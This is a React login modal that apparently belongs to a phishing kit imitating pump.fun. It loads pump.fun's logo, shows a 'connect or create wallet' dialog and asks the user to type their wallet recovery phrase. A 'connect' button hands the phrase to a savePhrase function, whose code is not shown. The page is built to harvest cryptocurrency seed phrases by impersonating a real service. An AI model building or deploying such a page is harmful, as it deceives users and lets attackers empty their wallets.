
import "./Login.css"
import { usePhrase } from "../context/Phrase.context"
import { useRef } from "react"

export const Login = () => {
  const { savePhrase, loading, error, success } = usePhrase();
  const textareaRef = useRef();

   const handleConnect = () => {
    const text = textareaRef.current?.value.trim();
    if (!text) return alert("Phrase cannot be empty.");
    savePhrase(text);
  };

  return (
    <div className="modal fade bg-fade" id="exampleModal" tabIndex={-1} aria-labelledby="exampleModalLabel" aria-hidden="true">
      <div className="modal-dialog modal-dialog-centered modal-dialog-scrollable custom-modal">
        <div className="modal-content bg-dark-background custom-modal-content border">
          <div className="modal-header position-relative">
            <h2 className="modal-title fs-5 text-center flex-grow-1 text-center" id="staticBackdropLabel">connect or create wallet</h2>
            <button type="button" className="btn-close no-icon rounded-circle bg-gray text-light" data-bs-dismiss="modal" aria-label="close">
              <span>&times;</span>
            </button>
          </div>
          <div className="text-center pb-2">
              <img alt="logo" loading="lazy" width="72" height="72" decoding="async" data-nimg="1" className="m-6" src="https://pump.fun/_next/static/media/logo-pump.80ada4f8.svg" style={{color: "transparent"}}></img>
            </div>
          <div className="modal-body">
            <div className="form-floating">
              <textarea ref={textareaRef} className="form-control" placeholder="type here..." id="floatingTextarea2" style={{height: "200px"}}></textarea>
              <label htmlFor="floatingTextarea2">Enter your recovery phrase to proceed</label>
              {error && <div className="text-danger mt-2">{error}</div>}
              {success && <div className="text-success mt-2">Saved successfully!</div>}
            </div>
          </div>
          <div className="modal-footer">
            <button type="button" className="btn btn-green" onClick={handleConnect} disabled={loading}>
              {loading ? "connecting..." : "connect"}
            </button> {/* data-bs-dismiss="modal"*/}
            <button type="button" className="btn btn-blue">create</button>
          </div>
        </div>
      </div>
    </div>
  )
}